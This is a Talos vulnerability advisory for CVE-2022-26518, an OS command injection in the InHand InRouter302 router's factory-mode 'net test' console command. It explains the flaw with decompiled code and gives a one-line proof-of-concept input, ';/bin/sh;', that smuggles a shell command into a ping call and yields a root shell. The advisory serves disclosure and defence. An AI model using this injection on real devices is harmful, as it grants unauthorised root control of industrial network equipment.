# Talos Vulnerability Report

### TALOS-2022-1501

## InHand Networks InRouter302 console infactory\_net command injection vulnerability

##### May 10, 2022

##### CVE Number

CVE-2022-26518

### Summary

An OS command injection vulnerability exists in the console infactory\_net functionality of InHand Networks InRouter302 V3.5.37. A specially-crafted series of network requests can lead to remote code execution. An attacker can send a sequence of requests to trigger this vulnerability.

### Tested Versions

InHand Networks InRouter302 V3.5.37

### Product URLs

InRouter302 - <https://www.inhandnetworks.com/products/inrouter300.html>

### CVSSv3 Score

9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

### Details

The InRouter302 is an industrial LTE router. It features remote management functionalities and several security protection mechanism, such as: VPN technologies, firewall functionalities, authorization management and several other features.

The InRouter302 offers telnet and sshd services. Both, when provided with the correct credentials, will allow access to the Router console.

Here is the prompt after the login:

```

The `infactory` command permits, provided the correct password, the access to the factory mode view. This mode permits to change the configuration and perform various tests. The factory mode view:

```
Router> infactory
input password:
Router(factory)#

hw_wdg         -- check the hardware watchdog status
dio            -- detect digital I/O
stategridsec   -- detect stategrid security chip
Router(factory)#

```

This mode offers several functionalities. For instance, the `net` functionality allows to essentially execute a ping command specifying its `interface` parameter.

The `net_functionality`:

```
undefined4 net_functionality(undefined4 param_1,int args)

{
    [...]

    argument_list_ptr[0] = args;
    [...]
    if (argument_list_ptr[0] != 0) {
        first_arg = (char *)maybe_get_next_token(argument_list_ptr);
        if (*first_arg != '\0') {
            is_init = strncmp(first_arg,"init",4);
            if (is_init == 0) {
                [...]
            }
            is_test = strncmp(first_arg,"test",4);
            if ((is_test == 0) &&
                (interface = (char *)maybe_get_next_token(argument_list_ptr),
                interface != (char *)0x0)) {                                                            [1]
                max_args = 3;
                packets_count = 0;
                timeout_ = 0;
                target_ip = (char *)0x0;
                [... here are parsed 3 optional parameters ...]
                snprintf((char *)&ping_command,0x80,"ping -I %s -c %d -W %d %s",interface,packets_count,
                        timeout,target_ip);                                                             [2]
                popen_stream = popen((char *)&ping_command,"r");                                        [3]
                [...]
}

```

If the first provided argument is `test`, then the second one, parsed at `[1]`, will be later used at `[2]` to form the string `ping -I <second_arg> -c <packets_count> -W <timeout> <target_ip>`. This string will later be used at `[3]` as argument of the popen function.

The second argument is not properly sanitized, and a command injection can occur at `[3]`. An attacker, able to reach the `net` functionality, would be able to obtain a root shell.

### Exploit Proof of Concept

Provided the command `net test ;/bin/sh;`, in the factory mode view, a root shell will be obtained:

```
Router(factory)# net test ;/bin/sh;
ping: option requires an argument -- I
BusyBox v1.26.2 (2022-02-23 16:03:56 CST) multi-call binary.

Usage: ping [OPTIONS] HOST
help
Built-in commands:
------------------
    . : [ [[ break cd chdir continue echo eval exec exit export false
    hash help history let local printf pwd read readonly return set
    shift source test times trap true type ulimit umask unset wait

```
